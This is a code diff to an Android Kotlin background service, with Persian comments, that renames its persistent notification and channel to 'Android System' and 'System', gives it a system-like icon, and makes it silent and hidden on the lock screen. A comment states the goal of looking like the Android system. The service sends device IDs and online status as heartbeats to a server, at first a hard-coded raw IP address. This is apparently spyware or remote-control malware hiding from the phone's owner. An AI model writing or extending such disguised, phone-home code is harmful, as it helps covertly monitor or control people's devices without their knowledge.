@@ -96,16 +96,25 @@ class NetworkService : Service() {
         createNotificationChannel()
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setContentTitle("Android System")  // ⭐ شبیه سیستم Android
+            .setContentText("Checking network...")
+            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)  // آیکون شبکه
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setSilent(true)
             .build()
 
-        startForeground(NOTIFICATION_ID, notification)
+        // ⭐ startForeground با سازگاری با همه نسخه‌های اندروید
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            // Android 14+ (API 34+) - با foregroundServiceType
+            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else {
+            // Android 7-13 - بدون type
+            startForeground(NOTIFICATION_ID, notification)
+        }
         Log.d(TAG, "✅ Started as Foreground Service")
     }
 
@@ -113,14 +122,15 @@ class NetworkService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Network Monitoring",
+                "System",  // ⭐ فقط "System"
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Monitoring network status"
+                description = "System services"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
                 setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
 
             val manager = getSystemService(NotificationManager::class.java)
@@ -227,11 +237,14 @@ class NetworkService : Service() {
                     put("deviceId", deviceId)
                     put("isOnline", isOnline)
                     put("timestamp", System.currentTimeMillis())
+                    put("source", "NetworkReceiver")
                 }
 
-                Log.d(TAG, "📤 Updating status: $isOnline")
+                Log.d(TAG, "📤 Sending heartbeat: $isOnline")
 
-                val url = URL("http://95.134.130.160:8765/devices/update-online-status")
+                // ⭐ استفاده از ServerConfig برای گرفتن Base URL
+                val baseUrl = ServerConfig.getBaseUrl()
+                val url = URL("$baseUrl/devices/heartbeat")
                 val conn = url.openConnection() as HttpURLConnection
 
                 conn.requestMethod = "POST"
